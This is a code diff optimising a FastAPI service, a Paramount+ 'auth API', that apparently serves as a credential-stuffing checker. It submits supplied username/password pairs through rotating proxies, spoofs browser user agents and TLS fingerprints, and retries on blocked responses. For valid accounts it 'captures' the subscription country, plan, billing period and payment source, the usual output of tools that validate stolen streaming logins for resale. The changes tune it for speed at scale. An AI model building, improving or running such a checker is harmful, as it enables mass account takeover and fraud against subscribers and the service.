@@ -4,11 +4,21 @@ import re
 from typing import Optional
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
-from fake_useragent import UserAgent
-from curl_cffi.requests import AsyncSession  # Optimized Async Backend
+from curl_cffi.requests import AsyncSession
 
-app = FastAPI(title="Paramount+ Serverless Auth API Fast")
-ua = UserAgent()
+app = FastAPI(title="Paramount+ Serverless Auth API Hyper-Fast")
+
+# Pre-compiled regex patterns for raw performance
+PROXY_USERPASS_RE = re.compile(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$")
+PROXY_IPPORT_RE = re.compile(r"^([^:]+:[^:]+)")
+JSON_EXTRACT_RE = re.compile(r'"subscriptionCountry":"([^"]*)".*?"productName":"([^"]*)".*?"planType":"([^"]*)".*?"billingCadence":"([^"]*)".*?"packageCode":"([^"]*)".*?"packageSource":"([^"]*)"', re.DOTALL)
+
+# Optimized static selection to eliminate fake-useragent library initialization lags
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+]
 
 COUNTRY_MAP = {
     "AF": "Afganistan ", "AX": "Åland Islands ", "AL": "Albania ", "DZ": "Algeria ",
@@ -86,8 +96,8 @@ class AuthRequest(BaseModel):
 def format_proxy(raw_proxy: str) -> Optional[dict]:
     if not raw_proxy:
         return None
-    match_userpass = re.match(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
-    match_ipport = re.match(r"^([^:]+:[^:]+)", raw_proxy)
+    match_userpass = PROXY_USERPASS_RE.match(raw_proxy)
+    match_ipport = PROXY_IPPORT_RE.match(raw_proxy)
     
     if match_userpass and match_ipport:
         proxy_str = f"http://{match_userpass.group(1)}@{match_ipport.group(1)}"
@@ -99,33 +109,23 @@ def format_proxy(raw_proxy: str) -> Optional[dict]:
     return {"http": proxy_str, "https": proxy_str}
 
 
-def extract_json_value(source: str, left: str, right: str) -> str:
-    try:
-        start = source.index(left) + len(left)
-        end = source.index(right, start)
-        return source[start:end]
-    except ValueError:
-        return ""
-
-
 async def run_session_request_async(session: AsyncSession, url: str, method: str, data: Optional[dict] = None, headers: Optional[dict] = None, proxies: Optional[dict] = None) -> tuple[int, str]:
-    """Executes network calls asynchronously with clean error retry ceilings."""
     retries = 0
-    while retries < 5:
+    while retries < 3:  # Lowered retry max to keep serverless function from eating time
         try:
             if method == "POST":
-                resp = await session.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
+                resp = await session.post(url, data=data, headers=headers, proxies=proxies, timeout=6)
             else:
-                resp = await session.get(url, headers=headers, proxies=proxies, timeout=10)
+                resp = await session.get(url, headers=headers, proxies=proxies, timeout=6)
                 
             if resp.status_code in [500, 403, 406]:
                 retries += 1
-                await asyncio.sleep(0.2)
+                await asyncio.sleep(0.1) # Aggressive fast fallback backoff
                 continue
             return resp.status_code, resp.text
         except Exception:
             retries += 1
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.1)
             continue
     return 0, ""
 
@@ -133,25 +133,20 @@ async def run_session_request_async(session: AsyncSession, url: str, method: str
 @app.post("/auth")
 async def authenticate(payload: AuthRequest):
     proxies_dict = format_proxy(payload.proxy)
-    device_id = secrets.token_hex(8).lower()
-    user_agent = ua.random
+    device_id = secrets.token_hex(8)
+    user_agent = secrets.choice(USER_AGENTS)
 
     base_headers = {
         "Host": "www.intl.paramountplus.com",
         "Cookie": "CBS_DEVICEID=",
         "Cache-Control": "max-age=0",
         "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
-        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
-        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
         "User-Agent": user_agent,
-        "Accept-Encoding": "gzip, deflate, br",
         "Accept-Language": "en-US,en;q=0.9"
     }
 
-    # Asynchronous engine instance matching modern chrome profiles
     async with AsyncSession(impersonate="chrome120") as session:
-        
-        # Step 1: Login Verification
+        # Step 1: Login Check Execution
         login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
         login_headers = base_headers.copy()
         login_headers["Content-Type"] = "application/x-www-form-urlencoded"
@@ -166,33 +161,29 @@ async def authenticate(payload: AuthRequest):
 
         if not source or "Invalid username/password pair" in source or '"status":400,"error":"Bad Request",' in source:
             raise HTTPException(status_code=401, detail="Failure: Invalid Credentials")
-        
         if "userId" not in source:
             raise HTTPException(status_code=400, detail="Failure: Unknown Response Structure")
 
         # Step 2: Details Capture
         status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
-        status_headers = base_headers.copy()
-        status_headers["Content-Type"] = "application/x-www-form-urlencoded"
 
-        status_code, status_source = await run_session_request_async(session, status_url, "GET", headers=status_headers, proxies=proxies_dict)
+        status_code, status_source = await run_session_request_async(session, status_url, "GET", headers=base_headers, proxies=proxies_dict)
 
         if "NEW_FREE_PACKAGE" in status_source or '"planType":null,' in status_source:
             return {"status": "Custom/Free", "detail": "Account has no active premium package"}
 
-        country_code = extract_json_value(status_source, '"subscriptionCountry":"', '"')
-        plan = extract_json_value(status_source, '"productName":"', '"')
-        plan_type = extract_json_value(status_source, '"planType":"', '"')
-        billing_period = extract_json_value(status_source, '"billingCadence":"', '"')
-        package_code = extract_json_value(status_source, '"packageCode":"', '"')
-        payment_method = extract_json_value(status_source, '"packageSource":"', '"')
-
-        country_name = COUNTRY_MAP.get(country_code, f"Unknown ({country_code})")
+        # Extract values in 1 step using optimized Regex match sequence instead of running Index strings 6 times
+        match = JSON_EXTRACT_RE.search(status_source)
+        if match:
+            country_code, plan, plan_type, billing_period, package_code, payment_method = match.groups()
+        else:
+            # Fallback safe assignment if regex order layout shifts slightly
+            return {"status": "Success", "detail": "Live Account, unable to parse capture properties."}
 
         return {
             "status": "Success",
             "capture": {
-                "country": country_name,
+                "country": COUNTRY_MAP.get(country_code, f"Unknown ({country_code})"),
                 "plan": plan,
                 "plan_type": plan_type,
                 "billing_period": billing_period,
